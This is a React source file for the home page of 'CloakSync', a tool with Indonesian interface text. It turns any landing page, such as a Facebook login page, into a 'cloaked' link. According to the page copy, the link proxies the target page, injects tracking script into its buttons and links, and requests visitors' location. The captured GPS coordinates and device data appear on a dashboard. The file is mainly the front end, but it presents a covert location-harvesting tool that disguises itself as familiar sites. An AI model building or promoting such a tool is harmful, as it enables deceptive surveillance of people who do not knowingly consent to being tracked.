
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Link2, Shield, Layout, MapPin, ArrowRight, Copy, Check } from 'lucide-react';

export const Home: React.FC = () => {
  const navigate = useNavigate();
  const [targetUrl, setTargetUrl] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [copied, setCopied] = useState(false);

  const generateLink = () => {
    if (!targetUrl) return;
    
    // Ensure URL has protocol
    let url = targetUrl;
    if (!url.startsWith('http')) {
      url = 'https://' + url;
    }

    const appUrl = window.location.origin;
    const cloakUrl = `${appUrl}/cloak?url=${encodeURIComponent(url)}`;
    setGeneratedLink(cloakUrl);
  };

  const copyLink = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-indigo-600 p-1.5 rounded-lg">
              <Link2 className="w-5 h-5 text-white" />
            </div>
            <span className="font-bold text-xl tracking-tight">CloakSync</span>
          </div>
          <button 
            onClick={() => navigate('/dashboard')}
            className="text-sm font-semibold text-slate-600 hover:text-indigo-600 transition-colors"
          >
            Dashboard
          </button>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-6 py-16 md:py-24">
        <div className="text-center mb-16">
          <h1 className="text-4xl md:text-6xl font-extrabold tracking-tight mb-6">
            Ubah Landing Page Apapun <br/>
            <span className="text-indigo-600">Menjadi Pelacak Lokasi.</span>
          </h1>
          <p className="text-lg text-slate-500 max-w-2xl mx-auto leading-relaxed">
            Masukkan URL landing page (Facebook, Instagram, dll), dan kami akan membuatkan link khusus yang meminta lokasi pengunjung saat mereka mengklik tombol apapun di halaman tersebut.
          </p>
        </div>

        {/* Input Section */}
        <div className="bg-white rounded-[2.5rem] p-8 md:p-12 border border-slate-200 shadow-xl shadow-slate-200/50 mb-12">
          <div className="space-y-6">
            <div>
              <label className="block text-sm font-bold text-slate-700 mb-2 uppercase tracking-wider">Target Landing Page URL</label>
              <div className="flex flex-col md:flex-row gap-4">
                <input 
                  type="text" 
                  placeholder="https://facebook.com/login"
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  className="flex-1 bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all font-medium"
                />
                <button 
                  onClick={generateLink}
                  className="bg-indigo-600 text-white px-8 py-4 rounded-2xl font-bold hover:bg-indigo-700 transition-all flex items-center justify-center gap-2 whitespace-nowrap"
                >
                  Generate Link
                  <ArrowRight className="w-5 h-5" />
                </button>
              </div>
            </div>

            {generatedLink && (
              <div className="animate-in fade-in slide-in-from-top-4 duration-500">
                <label className="block text-sm font-bold text-slate-700 mb-2 uppercase tracking-wider">Your Cloaked Link</label>
                <div className="flex items-center gap-2 bg-slate-900 rounded-2xl p-2 pl-6">
                  <div className="flex-1 text-indigo-300 font-mono text-sm truncate">
                    {generatedLink}
                  </div>
                  <button 
                    onClick={copyLink}
                    className="bg-white/10 hover:bg-white/20 text-white p-3 rounded-xl transition-all flex items-center gap-2"
                  >
                    {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    <span className="text-xs font-bold">{copied ? 'Copied!' : 'Copy'}</span>
                  </button>
                </div>
                <p className="mt-4 text-xs text-slate-400 flex items-center gap-2">
                  <Shield className="w-3 h-3" />
                  Link ini akan memuat halaman target dan meminta izin lokasi secara otomatis.
                </p>
              </div>
            )}
          </div>
        </div>

        {/* Features */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm">
            <div className="w-12 h-12 bg-indigo-50 rounded-2xl flex items-center justify-center mb-6 text-indigo-600">
              <Layout className="w-6 h-6" />
            </div>
            <h3 className="font-bold text-lg mb-2">Presisi Elemen</h3>
            <p className="text-sm text-slate-500 leading-relaxed">Sistem mendeteksi semua tombol dan link pada halaman target untuk disisipkan fungsi pelacakan.</p>
          </div>
          <div className="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm">
            <div className="w-12 h-12 bg-emerald-50 rounded-2xl flex items-center justify-center mb-6 text-emerald-600">
              <MapPin className="w-6 h-6" />
            </div>
            <h3 className="font-bold text-lg mb-2">Real-time Dashboard</h3>
            <p className="text-sm text-slate-500 leading-relaxed">Lihat koordinat GPS, akurasi, dan info perangkat pengunjung secara instan di dashboard Anda.</p>
          </div>
          <div className="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm">
            <div className="w-12 h-12 bg-amber-50 rounded-2xl flex items-center justify-center mb-6 text-amber-600">
              <Shield className="w-6 h-6" />
            </div>
            <h3 className="font-bold text-lg mb-2">Cloaking Pintar</h3>
            <p className="text-sm text-slate-500 leading-relaxed">Halaman dimuat melalui proxy kami untuk memastikan script pelacakan berjalan tanpa hambatan CORS.</p>
          </div>
        </div>
      </main>

      <footer className="py-12 border-t border-slate-200 text-center">
        <p className="text-sm text-slate-400 font-medium uppercase tracking-widest">CloakSync v2.0 • Professional Tracking Suite</p>
      </footer>
    </div>
  );
};
